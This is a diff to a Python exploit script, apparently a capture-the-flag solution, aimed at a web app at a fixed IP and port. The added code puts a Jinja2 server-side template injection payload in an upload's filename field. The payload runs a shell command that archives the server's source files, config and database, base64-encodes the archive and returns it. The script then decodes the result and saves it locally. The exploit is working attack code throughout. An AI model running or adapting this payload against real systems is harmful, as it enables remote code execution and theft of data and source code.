@@ -6,6 +6,7 @@ from shutil import copyfileobj
 from os import system, popen
 from json import loads
 from sys import stdout
+from io import BytesIO
 
 class NoRedirect(HTTPRedirectHandler):
     def redirect_request(self, req, fp, code, msg, headers, newurl):
@@ -94,6 +95,24 @@ Content-Type: text/html
     method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), stdout.buffer)
 
 print()
+
+content = BytesIO()
+copyfileobj(urlopen(Request(
+    "http://162.19.255.92:1337/upload",
+    data=b'''-----------------------------18136961752888167217815560157
+Content-Disposition: form-data; name="file"; filename="{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('tar -cvJ requirements.txt test database.db app config.py run.py Dockerfile | base64').read() }}"
+Content-Type: text/html
+
+{{ 7 * 7 }}
+
+-----------------------------18136961752888167217815560157--''',
+    method="POST", headers={"Content-Type": "multipart/form-data; boundary=---------------------------18136961752888167217815560157", "Cookie": f"token={token}"})), content)
+
+with open("sources.tar.xz", "wb") as file:
+    file.write(b64decode(b"".join(content.getvalue().split(b":")[1].split())))
+
+content.seek(0)
+copyfileobj(content, stdout.buffer)
 
 copyfileobj(urlopen(Request(
     "http://162.19.255.92:1337/upload",
